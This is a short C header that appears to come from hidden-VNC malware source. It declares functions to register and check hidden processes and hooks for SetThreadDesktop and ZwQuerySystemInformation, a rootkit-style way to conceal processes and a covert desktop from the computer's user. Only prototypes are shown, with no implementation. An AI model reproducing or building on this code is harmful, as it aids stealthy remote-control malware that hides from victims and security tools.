#ifndef _HIDEVNCPROCWND_H_
#define _HIDEVNCPROCWND_H_

HANDLE RegisterHiddenProcess();

bool IsProcessHidden(HANDLE dwProcessId);

#include <ntdll.h>

typedef BOOL WINAPI __SetThreadDesktop(HDESK hDesk);
BOOL WINAPI SetThreadDesktop_handler(HDESK hDesk);

typedef NTSTATUS NTAPI __ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);
NTSTATUS NTAPI ZwQuerySystemInformation_handler(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);

EXTERN_HOOK(SetThreadDesktop)
EXTERN_HOOK(ZwQuerySystemInformation)

#endif // _HIDEVNCPROCWND_H_